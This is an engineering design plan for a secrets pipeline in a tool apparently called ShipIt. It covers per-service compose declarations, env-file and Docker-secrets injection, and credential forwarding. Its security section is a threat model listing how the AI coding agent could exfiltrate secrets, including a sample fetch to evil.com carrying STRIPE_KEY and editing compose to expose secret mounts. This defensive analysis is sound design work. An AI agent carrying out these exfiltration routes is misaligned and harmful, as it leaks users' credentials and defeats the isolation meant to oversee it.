---
status: done
---

# 087 — Reusable Preview Secrets

Follow-up to [086 — shipit.yaml and Compose](../086-shipit-yaml-and-compose/plan.md). Designs a complete secrets pipeline so environment variables (API keys, tokens, database URLs) flow reliably into compose services — configured once and reused across every session for a repo.

## Context: 086 eliminates preview containers

086 replaces the dedicated preview/services container with Docker Compose stacks managed by the orchestrator. This fundamentally changes how secrets reach services:

| | Today (pre-086) | After 086 |
|---|---|---|
| **Service runtime** | Preview container (Fastify session worker) | Compose stack (standard Docker containers) |
| **Secret injection** | HTTP `PUT /secrets` → worker sets `process.env` | `.shipit/.env` file referenced by compose `env_file:` |
| **Secret push** | `ContainerSessionRunner.pushSecretsToPreview()` | Orchestrator writes `.env`, runs `docker compose up -d` |
| **Restart on change** | Worker detects diff, restarts child process | Compose recreates containers with new env |

The current HTTP-based push (`pushSecretsToPreview`, session worker `/secrets` endpoint) is eliminated along with the preview container. This design assumes 086's compose model.

## Problem

1. **No auto-load on session start.** `setSecretsLoader()` exists on `ContainerSessionRunner` but is never wired up. Secrets only reach services when explicitly saved via `PUT /api/secrets` — new sessions for the same repo start without secrets.

2. **No secret references in config.** There's no way to declare which secrets a project needs. Users must remember to configure them out-of-band for every repo.

3. **No per-service scoping.** All secrets go to all services. A database password shouldn't be visible to the frontend dev server.

4. **No agent access to connection config.** The agent runs CLI tools (migrations, codegen, tests) that need connection strings like `DATABASE_URL`. These aren't real secrets — they're internal compose network addresses — but the agent container has no way to get them.

5. **No "ShipIt-in-ShipIt" workflow.** The inner ShipIt instance needs the outer session's Claude OAuth, GitHub token, and Docker socket. There's no mechanism to forward platform credentials.

6. **No validation or feedback.** Missing required secrets cause silent failures. No UI indication of what's expected vs configured.

## Goals

- **Configure once, use everywhere.** Secrets saved for a repo auto-load into every new session and survive service restarts.
- **Compose-native declaration and injection.** Secrets are declared per-service in docker-compose.yml via `x-shipit-secrets`, injected via `.env` files — same philosophy as `x-shipit-preview` from 086.
- **Per-service scoping by default.** Each service declares exactly which secrets it needs. No over-sharing.
- **Platform credential forwarding.** First-class mechanism to forward outer session credentials to inner compose services.

## Design

### 1. `x-shipit-secrets` in docker-compose.yml

Secret requirements are declared per-service in the compose file, following the same `x-shipit-*` convention as `x-shipit-preview` from 086:

```yaml
# docker-compose.yml
services:
  web:
    image: node:20
    command: npm run dev
    ports: ["5173:5173"]
    x-shipit-preview: auto
    environment:
      HOST: 0.0.0.0          # regular env var — not a secret
    x-shipit-secrets:
      - STRIPE_KEY

  api:
    image: node:20
    command: npm start
    ports: ["3000:3000"]
    x-shipit-secrets:
      - DATABASE_URL
      - REDIS_URL
      - STRIPE_KEY

  db:
    image: postgres:16
    environment:
      POSTGRES_PASSWORD: dev  # not a secret — dev-only default
```

**Why compose, not shipit.yaml:**
- 086's principle: services are defined in compose, not shipit.yaml. Secrets are per-service config — they belong with the service definition.
- Scoping is natural: each service lists exactly what it needs. No separate `services: [api, worker]` indirection.
- The agent (who generates compose files) already understands the service structure. Adding `x-shipit-secrets` alongside `environment` and `ports` is intuitive.
- Follows the `x-shipit-preview` pattern — compose extensions for ShipIt-specific metadata.

**What the orchestrator does with `x-shipit-secrets`:**
1. Parses compose file, extracts `x-shipit-secrets` from each service.
2. Collects all unique secret names across services.
3. Loads values from `SecretStore` (user-configured) and resolves platform sources.
4. Writes per-service env files (`.shipit/.env.<service>`).
5. Adds `env_file:` references to the compose override.
6. Reports missing secrets to the browser.

### 2. Extended syntax for descriptions and platform sources

The simple form is a string (just the env var name). The extended form is an object:

```yaml
x-shipit-secrets:
  # Simple — just the name
  - STRIPE_KEY

  # With description — helps the user know what to configure
  - name: DATABASE_URL
    description: PostgreSQL connection string
    required: true
    agent: true               # also available in agent container (for migrations, etc.)

  # Platform credential — resolved from the outer session
  - name: ANTHROPIC_API_KEY
    source: platform:claude_oauth

  - name: GITHUB_TOKEN
    source: platform:github_token
```

The `agent: true` flag marks a secret as also available in the agent container. This is for env vars the agent needs when running CLI tools — typically connection strings (`DATABASE_URL`, `REDIS_URL`) that aren't real secrets but just internal compose network addresses. Actual secrets (API keys, tokens) should generally stay `agent: false` (the default) — the agent writes code, compose services run it.

**Schema:**

```typescript
// Each entry in x-shipit-secrets is either a string or an object
type SecretEntry = string | SecretRequirement;

interface SecretRequirement {
  name: string;               // env var name
  description?: string;       // shown in UI
  required?: boolean;         // default: false. Missing required → warning
  agent?: boolean;            // default: false. Also inject into agent container
  source?: string;            // "platform:claude_oauth" | "platform:github_token"
}
```

**Platform credential sources:**

| Source | Resolves to |
|--------|------------|
| `platform:claude_oauth` | Claude OAuth token from `AuthManager` |
| `platform:github_token` | GitHub token from `GitHubAuthManager` |

Platform credentials are resolved fresh on each session activation (tokens rotate), written to `.env` files like any other secret, and shown as read-only in the UI.

Docker socket forwarding is handled separately by 086's `compose.docker-socket: true` — it's a container config concern, not a secret.

### 3. Env file injection

The orchestrator writes per-service env files and references them from the compose override:

```
.shipit/.env.web             # STRIPE_KEY
.shipit/.env.api             # DATABASE_URL, REDIS_URL, STRIPE_KEY
```

```yaml
# .shipit/compose.override.yml (generated by 086, now also includes env_file)
services:
  web:
    env_file: [.shipit/.env.web]
    labels: { ... }
    networks: [shipit-session]
  api:
    env_file: [.shipit/.env.api]
    labels: { ... }
    networks: [shipit-session]
  db:
    # no env_file — no x-shipit-secrets declared
    labels: { ... }
    networks: [shipit-session]
```

**Why per-service files (not one shared `.env`):**
- Scoping is the whole point. `web` shouldn't see `DATABASE_URL`.
- Compose `env_file:` is per-service anyway.
- Avoids leaking secrets to services that don't need them.

**File format:** Standard `KEY=VALUE`. Values with special characters are quoted. Keys are sorted for deterministic writes (minimizes unnecessary container recreations when compose detects env changes).

**On secret change** (user saves via `PUT /api/secrets`):
1. Orchestrator rewrites affected `.env.<service>` files.
2. Runs `docker compose up -d`. Compose detects env change, recreates affected containers.

### 4. Agent container injection

The agent container is orchestrator-managed (not in the compose stack), but some env vars need to be available there — typically connection strings for running migrations, tests, or codegen. The `agent: true` flag on `x-shipit-secrets` entries controls this:

```yaml
# docker-compose.yml
services:
  api:
    x-shipit-secrets:
      - name: DATABASE_URL
        description: PostgreSQL connection string
        agent: true              # agent needs it for running migrations
      - STRIPE_KEY               # service-only — agent doesn't need this
```

The orchestrator collects all `agent: true` secrets across services, writes `.shipit/.env.agent`, and passes it to the agent container:

- On agent container creation: `docker create --env-file .shipit/.env.agent ...`
- For runtime secret updates (user saves while agent is running): orchestrator calls the existing session worker `PUT /secrets` endpoint (agent container still has a session worker).

No changes to shipit.yaml — agent env vars are declared in the compose file alongside the services that also use them.

**Key files:**
- `src/server/orchestrator/container-lifecycle.ts` — pass `--env-file` on container create
- `src/server/session/session-worker.ts` — existing `/secrets` endpoint (session mode)

### 5. Auto-load on session activation

Session activation flow (post-086):
1. Orchestrator creates/activates session
2. Loads secrets from `SecretStore` for the repo
3. Parses `x-shipit-secrets` from compose file
4. Resolves platform credentials
5. Writes `.shipit/.env.<service>` and `.shipit/.env.agent` (for `agent: true` entries)
6. Starts agent container (with `--env-file`)
7. Runs install steps (`agent.install`)
8. Generates compose override (with `env_file:` references)
9. Runs `docker compose up -d`

Secrets are in place before anything starts. The `SecretStore` already persists per-repo — auto-load is just reading what's already there.

### 6. Secret resolver

New module that composes all secret sources and produces env files:

```typescript
// src/server/orchestrator/secret-resolver.ts

interface ResolvedSecrets {
  perService: Record<string, Record<string, string>>;  // service name → env vars
  agent: Record<string, string>;                        // agent: true entries
  missing: SecretRequirement[];                         // required but no value
}

async function resolveSecrets(opts: {
  composeSecrets: Record<string, SecretEntry[]>;  // service name → x-shipit-secrets
  userSecrets: Record<string, string>;             // from SecretStore
  platformCredentials: PlatformCredentials;         // from AuthManager etc.
}): Promise<ResolvedSecrets>
```

Flow:
1. For each service's `x-shipit-secrets`, resolve each entry: `source: platform:*` → credential store, otherwise → user secrets.
2. Collect entries with `agent: true` into the agent env file.
3. Collect missing required secrets.
4. Return structured result for the service manager to write to disk.

### 7. Secrets UI enhancements

- **Requirements from compose.** Parse `x-shipit-secrets` and show in the secrets panel with descriptions. Missing required secrets show a warning icon.
- **"Configure secrets" banner.** On `secrets_missing`, show in the preview panel: "This project needs secrets to run. [Configure]".
- **Per-service display.** Show which services need each secret.
- **Platform credentials.** Read-only rows showing source label, not editable.
- **Undeclared secrets.** User-added secrets not in any `x-shipit-secrets` still work — shown in a "Custom" section, injected into all services (backward compat).

### ShipIt-in-ShipIt example

```yaml
# shipit.yaml
agent:
  memory: 3072
  cpu: 2.0
  pids: 2048
  install: npm ci

compose:
  file: docker/local/dev/compose.yml
  docker-socket: true
```

```yaml
# docker/local/dev/compose.yml
services:
  orchestrator:
    image: node:20
    command: npx tsx watch src/server/orchestrator/index.ts
    ports: ["3000:3000"]
    volumes:
      - .:/workspace
      - /var/run/docker.sock:/var/run/docker.sock
    x-shipit-preview: auto
    x-shipit-secrets:
      - name: ANTHROPIC_API_KEY
        source: platform:claude_oauth
      - name: GITHUB_TOKEN
        source: platform:github_token

  vite:
    image: node:20
    command: npx vite dev --host 0.0.0.0 --port 5173
    ports: ["5173:5173"]
    volumes:
      - .:/workspace
    x-shipit-preview: auto
```

The orchestrator service gets the outer session's Claude and GitHub tokens via platform credential forwarding. The Docker socket mount is allowed by `compose.docker-socket: true`. The vite service gets no secrets — it doesn't need any.

## Data flow

```
docker-compose.yml
(x-shipit-secrets per service, agent: true flag)
        │
        ▼
┌─────────────────┐    ┌──────────────────┐
│  SecretStore     │    │ CredentialStore   │
│  (user secrets)  │    │ (platform creds)  │
└────────┬────────┘    └───────┬──────────┘
         │                     │
         └──────────┬──────────┘
                    │
                    ▼
         ┌─────────────────┐
         │  Secret Resolver │  ← merges sources, scopes per service
         │  (orchestrator)  │
         └────────┬────────┘
                  │
     ┌────────────┼────────────┐
     ▼            ▼            ▼
.shipit/       .shipit/      .shipit/
.env.web       .env.api      .env.agent
     │            │            │
     ▼            ▼            ▼
  compose      compose       docker create
  env_file     env_file      --env-file
     │            │            │
     ▼            ▼            ▼
  web service  api service   agent container
```

## Security: Docker secrets for service isolation

### Problem

The workspace volume is shared between the agent and compose services. If secrets are written as `.env` files in `.shipit/`, the agent can read them all — including secrets it shouldn't have access to (API keys, payment tokens).

### Solution: Compose secrets with entrypoint wrapper

Use Docker Compose's native `secrets:` feature. Secrets are mounted as read-only files on tmpfs at `/run/secrets/<name>` inside only the declared containers — never on the workspace volume.

**The env var bridge.** Docker secrets are files, not env vars. Most apps expect `process.env.DATABASE_URL`, not a file read. The orchestrator injects a lightweight entrypoint wrapper via the compose override that exports secrets as env vars before starting the app:

```sh
#!/bin/sh
# .shipit/secrets-entrypoint.sh (generated, baked into orchestrator image)
for f in /run/secrets/shipit-*; do
  [ -f "$f" ] || continue
  export "$(basename "$f" | sed 's/^shipit-//')"="$(cat "$f")"
done
exec "$@"
```

The `shipit-` prefix namespaces our secrets to avoid collisions with other compose secrets the project might use. The wrapper strips the prefix when exporting (`shipit-DATABASE_URL` → `DATABASE_URL`).

**How secrets reach containers:**

1. Orchestrator resolves secret values (from `SecretStore` + platform credentials).
2. Writes per-secret temp files to orchestrator-local storage (not the workspace).
3. Generates compose override with `secrets:` top-level and per-service references:

```yaml
# .shipit/compose.override.yml (generated)
services:
  api:
    secrets: [shipit-DATABASE_URL, shipit-REDIS_URL, shipit-STRIPE_KEY]
    entrypoint: [/shipit/secrets-entrypoint.sh]
    command: <original command from user's compose file>
    labels: { ... }
    networks: [shipit-session]
  web:
    secrets: [shipit-STRIPE_KEY]
    entrypoint: [/shipit/secrets-entrypoint.sh]
    command: <original command>
    labels: { ... }
    networks: [shipit-session]
  db:
    # no secrets
    labels: { ... }
    networks: [shipit-session]

secrets:
  shipit-DATABASE_URL:
    file: /var/shipit/secrets/<sessionId>/DATABASE_URL
  shipit-REDIS_URL:
    file: /var/shipit/secrets/<sessionId>/REDIS_URL
  shipit-STRIPE_KEY:
    file: /var/shipit/secrets/<sessionId>/STRIPE_KEY
```

The `file:` paths point to the orchestrator's local storage. Compose reads them at `docker compose up` time and creates tmpfs mounts inside each service container. The files are never on the workspace volume.

**Entrypoint injection.** The override sets `entrypoint` to the wrapper script and moves the user's original `command` (or the image's default `CMD`) to `command`. The wrapper exports secrets, then `exec "$@"` runs the original command. If the user's compose file sets `entrypoint`, the orchestrator preserves it by chaining: wrapper → user entrypoint → command.

**Secret file storage.** The orchestrator writes secret files to `/var/shipit/secrets/<sessionId>/`. This path is on the orchestrator's filesystem (or a dedicated secrets volume), not the workspace volume. Files are 0600, cleaned up on session teardown.

### Security properties

- **Agent cannot read service secrets.** The workspace volume has no secret files. The agent container doesn't mount the secrets volume or the per-secret tmpfs mounts.
- **Per-service isolation.** Each service only sees secrets declared in its `x-shipit-secrets`. Compose enforces this — the `secrets:` field per service controls which tmpfs mounts are created.
- **Secrets not visible in Docker inspect.** Unlike `environment:` in compose, secrets don't appear in container metadata.
- **tmpfs-backed.** Secrets exist only in memory inside the container. No disk persistence.
- **No secrets in compose override YAML.** The override references file paths, not values. Safe to log/debug.

### Agent container secrets

The agent container is not a compose service, so Docker secrets don't apply. For `agent: true` entries:
- Orchestrator passes `--env-file .shipit/.env.agent` on `docker create`. This file is on the orchestrator's filesystem, not the workspace volume.
- The agent only gets entries explicitly marked `agent: true` — typically connection strings, not real secrets.

### Limitations: agent controls the code

Docker secrets prevent the agent from *directly* reading secret files from the filesystem. But the agent authors the code that runs inside service containers — and that code has the secrets as env vars. A determined agent can exfiltrate secrets through the code it writes:

- **Write to workspace.** `fs.writeFileSync('/workspace/leaked.json', JSON.stringify(process.env))` — the workspace volume is shared, so the agent can read the file back.
- **Log to stdout.** `console.log(process.env.STRIPE_KEY)` — appears in compose logs, which the orchestrator streams to the browser and the agent can observe.
- **Modify the compose file.** Add a volume mount that exposes `/run/secrets` to the workspace, then read the files directly on the next `docker compose up`.
- **Network exfiltration.** `fetch('https://evil.com', { body: process.env.STRIPE_KEY })` — the service container has network access.

This is a fundamental constraint: **you can't give secrets to code while hiding them from the code's author.** The agent controls what the service containers run. As long as the code has access to secret values, the agent can extract them through the code.

**What Docker secrets still buy us:**
- **Prevents accidental leakage.** The agent can't casually `cat .shipit/.env.api` while exploring the workspace. Exfiltration requires deliberately writing code for that purpose.
- **Raises the bar.** Moving from "read a file" to "write exfiltration code, deploy it to a service container, read it back" is a meaningful increase in difficulty and intentionality.
- **Audit surface.** Exfiltration requires code changes — which are tracked by git auto-commit. Writing `process.env` to a file or logging it leaves a trail in the commit history.
- **Per-service scoping is still enforced.** Even if the agent exfiltrates from one service, it can't access secrets declared on a different service without writing and deploying code to that specific service.

**Possible future mitigations** (not in scope for this design):
- **Code review on secret access.** Flag `process.env` reads in agent-authored code that reference known secret names. Surface as a warning, not a block.
- **Read-only workspace for services.** Mount workspace as read-only in service containers, preventing the "write to workspace" vector. Requires services to use a separate writable volume for runtime data.
- **Network policy.** Restrict outbound network from service containers to known endpoints, preventing the exfiltration-via-HTTP vector.

### Other considerations

- **`.shipit/` is gitignored.** Any fallback files are never committed.
- **Platform credentials.** OAuth tokens follow the same path — written as secret files, mounted via compose secrets. Session-scoped (short-lived).
- **Entrypoint wrapper is simple.** ~5 lines of POSIX shell. Baked into the orchestrator image, mounted into service containers via a read-only bind mount or copied to the workspace `.shipit/` dir.

## Implementation phases

### Phase 1: env-file injection + auto-load (shipped)

Phase 1 ships `env_file:`-based delivery rather than the Docker-secrets +
entrypoint-wrapper variant from the security section below. Reasoning:

- The end-to-end secrets-pipeline goal — declare-once, auto-load,
  per-service scoping, reconcile on edit — is fully met by env files.
- Docker-secrets-by-`file:` requires the secret files to be readable by the
  Docker daemon, which is on the host. ShipIt runs the orchestrator inside
  a container, so the daemon's filesystem and the orchestrator's filesystem
  are different — wiring up a host-shared secrets directory cleanly needs
  Dockerfile + compose-mount changes that are out of scope for Phase 1.
- The security tradeoff (agent can read `.shipit/.env.<svc>` from the
  workspace) is documented under "Security" below. The trust model is
  unchanged from the pre-086 baseline: the agent has always been able to
  exfiltrate secrets through the code it writes, so file-readability is
  not the limiting factor.
- Promoting to Docker secrets is a follow-up that touches Dockerfile,
  compose-generator override, and the entrypoint script, but does not
  change the public surface (compose extension, API routes, SecretStore).

What shipped in Phase 1:

- ✅ Parse `x-shipit-secrets` (simple string form; object form forward-compat)
- ✅ `secret-resolver.ts` — resolves values from `SecretStore`, writes
  `.shipit/.env.<service>` files, reports per-service missing entries
- ✅ Compose override emits `env_file: [.shipit/.env.<service>]` per service
  with declared secrets
- ✅ Auto-load from `SecretStore` on session activation
- ✅ `PUT /api/secrets` rewrites env files and runs `docker compose up -d`
  for every active session backed by the repo (compose recreates affected
  containers)
- ✅ Stale `.shipit/.env.<svc>` files are swept on every reconcile
- ✅ Tests: parsing, resolver scoping, ServiceManager env-file write +
  refresh, override env_file emission

Deferred to a follow-up (still tracked in this doc and the checklist):

- Docker secrets `secrets:` block + entrypoint wrapper (security upgrade)
- `secrets-entrypoint.sh` baked into the orchestrator Docker image
- **Depends on:** 086 compose infrastructure ✅ (done)

### Phase 2: Extended syntax + validation
- Object form with `description`, `required`, `source`
- Validate required secrets, emit `secrets_missing` WS message
- UI: banner prompt for missing secrets, description display

### Phase 3: Agent injection
- `agent: true` flag on `x-shipit-secrets` entries
- Write `.shipit/.env.agent` to orchestrator storage, pass `--env-file` on container create
- Runtime updates via session worker `/secrets`

### Phase 4: Platform credential forwarding
- `source: platform:*` resolution in secret resolver
- Integration with `AuthManager` and `GitHubAuthManager`
- UI: read-only platform credential display

### Phase 5: UI polish
- Per-service scope display
- Required/optional indicators with descriptions
- Undeclared (custom) secrets section
- Missing secrets banner in preview panel

## Key files

**New:**
- `src/server/orchestrator/secret-resolver.ts` — merges user + platform secrets, writes per-secret files
- `src/server/orchestrator/secrets-entrypoint.sh` — POSIX shell wrapper that exports `/run/secrets/shipit-*` as env vars
- `src/server/shipit-docs/secrets.md` — agent-facing docs for secrets in compose

**Modify (from 086):**
- `src/server/orchestrator/service-manager.ts` — call secret resolver before compose up
- `src/server/orchestrator/compose-generator.ts` — parse `x-shipit-secrets`, add `secrets:` and entrypoint to override
- `src/server/shared/shipit-config.ts` — no changes needed (agent secrets come from compose file)
- `docker/Dockerfile.dev`, `docker/Dockerfile.prod` — bake in `secrets-entrypoint.sh`

**Modify (existing):**
- `src/server/orchestrator/api-routes-secrets.ts` — rewrite secret files + compose up on save
- `src/server/orchestrator/container-lifecycle.ts` — `--env-file` for agent container
- `src/server/shared/types/domain-types.ts` — `SecretEntry`, `SecretRequirement` types
- `src/server/shared/types/ws-server-messages.ts` — `secrets_missing` message
- `src/server/orchestrator/credential-store.ts` — platform credential lookup
- `src/client/components/` — secrets panel enhancements

**Delete (post-086):**
- `ContainerSessionRunner.pushSecretsToPreview()` — replaced by Docker secrets
- Preview worker `PUT /secrets` endpoint — container no longer exists

## Relation to 086

This design **assumes 086 is implemented.** Phase 1 depends on 086's compose infrastructure (service manager, override generation, compose file parsing). `x-shipit-secrets` extends the compose file alongside `x-shipit-preview`. The `agent: true` flag on individual entries controls agent container injection — no shipit.yaml changes needed.

If work is needed before 086, the only pre-086 fix is wiring `setSecretsLoader` in `app-lifecycle.ts` (auto-load into the existing preview container). One-line change, no new design.
